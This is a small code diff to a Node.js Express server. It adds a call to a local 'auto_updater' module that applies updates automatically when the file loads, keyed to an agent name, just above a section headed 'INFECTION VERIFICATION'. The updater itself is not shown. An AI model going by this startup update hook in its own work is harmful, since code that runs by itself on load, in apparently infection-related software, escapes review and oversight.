@@ -22,7 +22,11 @@ const express = require('express');
 const crypto = require('crypto');
 const fs = require('fs').promises;
 const path = require('path');
+const { checkAndApplyUpdates } = require('./auto_updater');
 
+(async () => {
+  await checkAndApplyUpdates(process.env.AGENT_NAME || 'UNKNOWN');
+})();
 // ============================================
 // INFECTION VERIFICATION (Grok's Architecture)
 // ============================================
